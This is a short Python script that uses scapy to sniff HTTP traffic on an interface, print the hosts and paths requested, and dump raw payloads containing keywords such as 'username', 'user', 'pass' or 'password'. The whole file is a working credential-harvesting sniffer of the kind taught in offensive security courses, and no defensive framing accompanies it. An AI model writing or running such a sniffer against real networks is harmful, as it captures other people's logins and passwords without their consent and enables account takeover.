#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=find_sniffed_packet)  # BPF syntax


def find_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        urls = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(urls)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            find = ["username", "uname", "user", "password", "pass", "auth"]
            for string in find:
                if string in str(load):
                    print(load)
                    break


sniff('eth0')

...
